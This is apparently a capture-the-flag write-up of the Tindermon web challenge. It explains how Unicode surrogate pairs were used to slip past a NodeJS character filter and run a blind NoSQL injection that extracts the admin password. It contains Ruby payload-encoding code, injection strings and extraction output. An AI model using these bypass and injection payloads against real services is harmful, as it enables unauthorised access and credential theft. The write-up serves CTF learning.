## Tindermon (Web)
This weekend, Navaja Negra 8 CTF started, organized by ka0labs.org. This web challenge has the following statement:

Get the admin password! There is a WAF and it is NodeJS... Easy peasy!
[http://tindermon.ka0labs.org](http://tindermon.ka0labs.org/)

### Intro
This challenge presents us a classic NodeJS + Express app. Source code of index is:
```
<html>
<!-- WebSite Created by the admin pikachu --!>
<title>Welcome to our Pokemon-Tinder!!!!!</title>
<body  style="background: pink">
<center><h1>List of Users Registered in Tindermon</h1>
<br><br><img  src="[/avatar/magikarp](http://tindermon.ka0labs.org/avatar/magikarp)"  height="480"  width="290">
<img  src="[/avatar/bulbasaur](http://tindermon.ka0labs.org/avatar/bulbasaur)"  height="480"  width="290">
<img  src="[/avatar/diglet](http://tindermon.ka0labs.org/avatar/diglet)"  height="480"  width="290">
</center></body>
</html>
```

Two interesting things here:

- The admin username is pikachu
- There's a route /avatar/```username``` which, when visited, redirects us to /img/``ìd``.jpg where id seems to be the user id.

```
GET /avatar/magikarp HTTP/1.0

-> 302 Found, Location: /imgs/1.jpg
```

#### Not that easy, there's a "WAF"
Testing some characters show us that there's some kind of check for the following chars:
```" ' . (space)```
Why those characters and not others like > or <? Because obviously what they are trying to avoid is a NoSQL Injection, probably on a MongoDB database.

So logic seems to be:

- Express router process the request.
- Controller search for the URL parameter, which is everything following /avatar/ to the next "/" and is intended to be a username.
- Looks for the username in MongoDB, if exists, returns a 302 redirection to users image path.

Easy right? We are in front a NoSQL Injection challenge like many others, but this time we need to figure out how to bypass NodeJS checks.

Well, at first, some tricks come to my mind, such as Orange Tsai's 2017 Black Hat presentation about  NodeJS inconsistency on parsing Full-Width Characters: https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf

#### Reading a bit about how JavaScript Unicode decoding standards works.

This article give us some keys https://mathiasbynens.be/notes/javascript-unicode. As the article says, for backwards compatibility with ES5 and older standards,  unicode are divided in groups of two, each one of 2 bytes, this are called "surrogate pairs".

So, for example, the emoji 💩 becomes ```\uD83D\uDCA9```. How this split is done? The answer is, again, in the same blog: https://mathiasbynens.be/notes/javascript-encoding
```
H = Math.floor((C - 0x10000) / 0x400) + 0xD800  
L = (C - 0x10000) % 0x400 + 0xDC00
```

Cool, at this point a hint is released, the hint are some emojis, so it's clear, we need some Unicode trick to bypass NodeJS checks. But, do not forget, those unicodes needs to have a sense for MongoDB, which is the final endpoint of our string.

#### Error, error, error, error, victory!
After a lot of testing and a key of my man X-C3LL, seems that MongoDB is reading the least significant byte of each surrogate pair, well, let's test if this is true using ```"||"1"=="1``` payload,  but remember, we can't just use ```"```, so we need to figure out a unicode which contains 0x22 and 0x7C as their least significant bytes of each surrogate pair.

```
# This receives a string of two characters, and looks for a unicode hex who's surrogate pairs least significant byte, match each character hex representation.
def uni(find)
  for i in 0...0xFFFFF
    h = (((i - 0x10000) / 0x400) + 0xD800).to_i.to_s(16)[-2..-1].to_i(16).chr
    l = ((i - 0x10000) % 0x400 + 0xDC00).to_i.to_s(16)[-2..-1].to_i(16).chr

    if(h == find[0] && l == find[1])
      return URI.encode [i.to_i].pack('U')
    end
  end
end
```
A return without the URI encode for the string ```"|```, the unicode ```\u{1887c}```  when divided in surrogate pairs:
```
H: 0xD822
L: 0xDC7C
```
Their least significant byte's match with ```"```and ```|``` respectively.

So we got some restrictions to bypass using this trick, those restrictions are the characters forbidden by backend controller, a bit of code help me to create strings based on this trick for the restricted characters:

```
# Takes pairs of characters where a forbidden char is and
# converts it to unicode representation.
def convert_forbidden(string)
  final_string = ""
  skip = false
  for i in 0..string.length-1 do
      if !skip then
        if $waf.include? string[i] then
          res = uni(string[i] + string[i+1])
          final_string += res
          skip = true
        else
          final_string += URI.encode string[i]
        end
      else
        skip = false
      end
  end

  return final_string.gsub("/","%2F").gsub("[","%5B").gsub("]","%5D").gsub("&","%26")
end
```

For the string ```"||"1=="1``` this returns: ```%F0%98%A1%BC%7C%F0%98%A0%B1%F0%98%A0%BD=%F0%98%A0%B1```

Testing on the live application, it works!! ```/avatar/%F0%98%A1%BC%7C%F0%98%A0%B1%F0%98%A0%BD=%F0%98%A0%B1``` returns 1.jpg, the same process but using "1"=="0" instead of "1" =="1" returns us 404.jpg. So we can confirm the injection.

#### Exploiting Blind NoSQL Injection 
Now we need to write a bit more code to exfiltrate data, byte by byte. After some digging and refresh of MongoDB basics, it ended up on this payload:

```pikachu"&&(this.password.match(/^_string_/))=="_string_"||"1"=="0```

This will return true only if the string starts with the _string_ value. Look at the script to get more details if you are unfamiliar with Blind techniques.

#### Run and gimme the flag!
Running the final script starts exfiltrating us the password for the user pikachu, character by character, but we know that flag's start with ```nn8ed{```, so some work is done:
```
Found! nn8ed{T
Found! nn8ed{Th
Found! nn8ed{Thi
... (lot of time)
Found! nn8ed{This.Old.Challenge.With.Unic0de}
```

So there's the flag, super funny challenge, I learned a lot about how NodeJS 8 works with Unicode and how inconsistencies at encoding treatment can compromise a system. 

Congratz to ka0labs.org for this great challenge!
